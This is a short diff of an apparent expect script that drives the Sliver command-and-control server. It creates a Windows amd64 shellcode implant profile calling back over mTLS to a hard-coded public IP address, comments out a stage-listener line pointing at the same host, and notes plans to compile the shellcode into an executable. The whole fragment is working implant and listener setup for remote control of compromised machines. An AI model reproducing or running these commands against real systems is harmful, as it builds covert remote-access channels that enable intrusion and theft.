@@ -21,7 +21,7 @@ sleep 0.1
 
 # Continue using sliver-server
 send "profiles new --mtls 18.143.102.216:8080 --skip-symbols --format shellcode --arch amd64 win64\r"
-send "stage-listener --url tcp://18.143.102.216:1234 --profile win64\r"
+# send "stage-listener --url tcp://18.143.102.216:1234 --profile win64\r"
 send "jobs\r"
 
 # this following is using for creating shellcode in c format to comple exe
